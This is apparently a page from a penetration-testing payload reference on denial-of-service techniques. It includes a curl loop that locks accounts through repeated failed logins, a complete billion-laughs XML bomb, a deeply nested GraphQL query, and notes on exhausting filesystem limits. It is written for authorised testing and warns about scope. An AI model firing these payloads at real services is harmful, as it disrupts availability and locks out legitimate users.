# Denial of Service

> A Denial of Service (DoS) attack aims to make a service unavailable by overwhelming it with a flood of illegitimate requests or exploiting vulnerabilities in the target's software to crash or degrade performance. In a Distributed Denial of Service (DDoS), attackers use multiple sources (often compromised machines) to perform the attack simultaneously.


## Summary

* [Methodology](#methodology)
    * [Locking Customer Accounts](#locking-customer-accounts)
    * [File Limits on FileSystem](#file-limits-on-filesystem)
    * [Memory Exhaustion - Technology Related](#memory-exhaustion---technology-related)
* [References](#references)


## Methodology

Here are some examples of Denial of Service (DoS) attacks. These examples should serve as a reference for understanding the concept, but any DoS testing should be conducted cautiously, as it can disrupt the target environment and potentially result in loss of access or exposure of sensitive data.


### Locking Customer Accounts

Example of Denial of Service that can occur when testing customer accounts. 
Be very careful as this is most likely **out-of-scope** and can have a high impact on the business.

* Multiple attempts on the login page when the account is temporary/indefinitely banned after X bad attempts.
    ```ps1
    for i in {1..100}; do curl -X POST -d "username=user&password=wrong" <target_login_url>; done
    ```


### File Limits on FileSystem

When a process is writing a file on the server, try to reach the maximum number of files allowed by the filesystem format. The system should output a message: `No space left on device` when the limit is reached.
 
| Filesystem | Maximum Inodes |
| ---        | --- |
| BTRFS      | 2^64 (~18 quintillion) |
| EXT4       | ~4 billion |
| FAT32      | ~268 million files |
| NTFS       | ~4.2 billion (MFT entries) |
| XFS        | Dynamic (disk size) |
| ZFS        | ~281 trillion |

An alternative of this technique would be to fill a file used by the application until it reaches the maximum size allowed by the filesystem, for example it can occur on a SQLite database or a log file.

FAT32 has a significant limitation of **4 GB**, which is why it's often replaced with exFAT or NTFS for larger files.

Modern filesystems like BTRFS, ZFS, and XFS support exabyte-scale files, well beyond current storage capacities, making them future-proof for large datasets.


### Memory Exhaustion - Technology Related

Depending on the technology used by the website, an attacker may have the ability to trigger specific functions or paradigm that will consume a huge chunk of memory.

* **XML External Entity**: Billion laughs attack/XML bomb
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>
    ```
* **GraphQL**: Deeply-nested GraphQL queries.
    ```ps1
    query { 
        repository(owner:"rails", name:"rails") {
            assignableUsers (first: 100) {
                nodes {
                    repositories (first: 100) {
                        nodes {
                            
                        }
                    }
                }
            }
        }
    }
    ```
* **Image Resizing**: try to send invalid pictures with modified headers, e.g: abnormal size, big number of pixels.
* **SVG handling**: SVG file format is based on XML, try the billion laughs attack.
* **Regular Expression**: ReDoS


## References

- [DEF CON 32 - Practical Exploitation of DoS in Bug Bounty - Roni Lupin Carta - October 16, 2024](https://youtu.be/b7WlUofPJpU)
- [Denial of Service Cheat Sheet - OWASP Cheat Sheet Series - July 16, 2019](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)